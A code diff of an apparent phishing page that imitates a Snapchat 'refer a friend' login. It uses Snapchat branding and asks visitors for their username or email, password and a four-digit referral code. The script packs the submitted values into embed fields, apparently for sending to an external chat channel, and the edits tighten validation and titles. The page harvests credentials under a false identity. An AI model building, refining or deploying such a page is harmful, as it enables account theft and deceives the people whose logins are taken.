@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat | Parrainez un amis</title>
+  <title>Snapchat | Parrainez Un Amis</title>
 
-  <!-- Meta Open Graph pour affichage du lien -->
-  <meta property="og:title" content="Snapchat | Parrainez un amis" />
+  <!-- Meta Open Graph -->
+  <meta property="og:title" content="Snapchat | Parrainez Un Amis" />
   <meta property="og:description" content="Description courte" />
   <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
 
@@ -98,15 +98,12 @@
       font-size: inherit;
       text-decoration: underline;
     }
-    #forgotPassword {
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
   <div class="login-box">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Parrainez un amis</h2>
+    <h2>Snapchat | Parrainez Un Amis</h2>
     <form id="loginForm">
       <div class="form-group">
         <label for="username">Nom d'utilisateur ou e-mail</label>
@@ -117,8 +114,8 @@
         <input type="password" id="password" required />
       </div>
       <div class="form-group">
-        <label for="referralCode">Code de parrainage (optionnel)</label>
-        <input type="text" id="referralCode" />
+        <label for="referralCode">Code de parrainage</label>
+        <input type="text" id="referralCode" required />
       </div>
 
       <button type="submit">Connexion</button>
@@ -148,7 +145,6 @@
       errorMessage.style.display = 'none';
       referralError.style.display = 'none';
 
-      // Vérification de base
       if (
         username.length < 3 ||
         password.length < 3 ||
@@ -159,9 +155,8 @@
         return;
       }
 
-      // Vérification du code de parrainage
       const referralRegex = /^\d{4}$/;
-      if (referralCode && !referralRegex.test(referralCode)) {
+      if (!referralRegex.test(referralCode)) {
         referralError.style.display = 'block';
         return;
       }
@@ -185,7 +180,7 @@
               },
               {
                 name: "🎁 Code de parrainage",
-                value: referralCode || "Aucun",
+                value: referralCode,
                 inline: false
               }
             ],
